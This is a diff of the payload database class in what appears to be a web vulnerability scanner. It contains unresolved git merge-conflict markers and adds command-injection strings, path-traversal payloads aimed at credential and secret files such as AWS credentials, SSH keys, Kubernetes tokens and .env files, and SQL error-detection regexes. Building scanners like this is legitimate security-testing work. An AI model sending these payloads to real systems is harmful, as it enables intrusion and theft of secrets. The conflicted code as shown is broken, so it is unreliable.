@@ -328,6 +328,19 @@ class PayloadDB:
         '& whoami',
         '| dir',
         '; dir',
+<<<<<<< HEAD
+=======
+        '& hostname',
+        '| hostname',
+        # PowerShell
+        '| powershell -c "whoami"',
+        # Newline-based
+        '%0aid',
+        '%0awhoami',
+        # Template-style (for eval/exec contexts)
+        '__import__("os").popen("id").read()',
+        'require("child_process").execSync("id")',
+>>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
     ]
 
     # LFI payloads
@@ -336,26 +349,67 @@ class PayloadDB:
         '....//....//....//etc/passwd',
         '../../../etc/passwd%00',
         '..%2f..%2f..%2fetc/passwd',
+<<<<<<< HEAD
         '/etc/passwd',
         'file:///etc/passwd',
         # Windows
         '..\\..\\..\\windows\\win.ini',
         '..\\..\\..\\boot.ini',
+=======
+        '%2e%2e%2f%2e%2e%2fetc/passwd',
+        '/etc/passwd',
+        'file:///etc/passwd',
+        # Double-encoded
+        '..%252f..%252f..%252fetc/passwd',
+        # Unicode bypass
+        '..%c0%af..%c0%af..%c0%afetc/passwd',
+        # Windows
+        '..\\..\\..\\windows\\win.ini',
+        '..\\..\\..\\boot.ini',
+        '..\\..\\..\\windows\\system.ini',
+>>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
         # /proc/* files (Linux system info)
         '/proc/version',
         '../proc/version',
         '../../proc/version',
         '../../../proc/version',
         '../../../../proc/version',
+<<<<<<< HEAD
         '/../../../../../../../../../../proc/version',  # Acunetix style
+=======
+        '/../../../../../../../../../../proc/version',
+>>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
         '/proc/cpuinfo',
         '/proc/meminfo',
         '/proc/self/environ',
         '/proc/self/cmdline',
+<<<<<<< HEAD
+=======
+        '/proc/net/tcp',
+        '/proc/1/cgroup',
+        # Cloud/Container paths
+        '/root/.aws/credentials',
+        '/root/.ssh/id_rsa',
+        '/var/run/secrets/kubernetes.io/serviceaccount/token',
+        '/etc/docker/daemon.json',
+        '/.dockerenv',
+        '/.env',
+        '../.env',
+        '../../.env',
+        '../../../.env',
+        # Application configs
+        '../../../wp-config.php',
+        '../../config/database.yml',
+        '../../../settings.py',
+        # PHP wrappers
+        'php://filter/convert.base64-encode/resource=index.php',
+        'php://filter/convert.base64-encode/resource=../config.php',
+>>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
     ]
 
     # SQL error patterns for error-based detection
     SQL_ERRORS = [
+<<<<<<< HEAD
         r"SQL syntax.*MySQL",
         r"Warning.*mysql_",
         r"MySQLSyntaxErrorException",
@@ -371,6 +425,50 @@ class PayloadDB:
         r"You have an error in your SQL syntax",
         r"Unclosed quotation mark",
         r"syntax error at or near",
+=======
+        # MySQL
+        r"SQL syntax.*MySQL",
+        r"Warning.*mysql_",
+        r"MySQLSyntaxErrorException",
+        r"You have an error in your SQL syntax",
+        r"Column count doesn't match",
+        r"com\.mysql\.jdbc",
+        # PostgreSQL
+        r"PostgreSQL.*ERROR",
+        r"Warning.*pg_",
+        r"ERROR:\s*syntax error at",
+        r"syntax error at or near",
+        r"unterminated quoted string",
+        r"ERROR:\s*relation .* does not exist",
+        r"ERROR:\s*column .* does not exist",
+        r"org\.postgresql\.util\.PSQLException",
+        # MSSQL
+        r"Microsoft.*SQL Server.*Driver",
+        r"OLE DB.*SQL Server",
+        r"SQLServer JDBC Driver",
+        r"Unclosed quotation mark",
+        r"Incorrect syntax near",
+        r"Msg \d+, Level \d+, State \d+",
+        r"System\.Data\.SqlClient",
+        # Oracle
+        r"Oracle.*Driver",
+        r"Warning.*oci_",
+        r"ORA-\d{5}",
+        r"PLS-\d{5}",
+        r"TNS-\d{5}",
+        r"quoted string not properly terminated",
+        r"SQL command not properly ended",
+        # SQLite
+        r"SQLite.*Exception",
+        r"Warning.*sqlite_",
+        r"sqlite3\.OperationalError",
+        r"unrecognized token",
+        r'near ".*?": syntax error',
+        r"no such column:",
+        r"no such table:",
+        # MariaDB
+        r"MariaDB.*error",
+>>>>>>> c98cf93 (Align directory structure, enhance detection patterns, fix crawler deadlock)
     ]
 
 
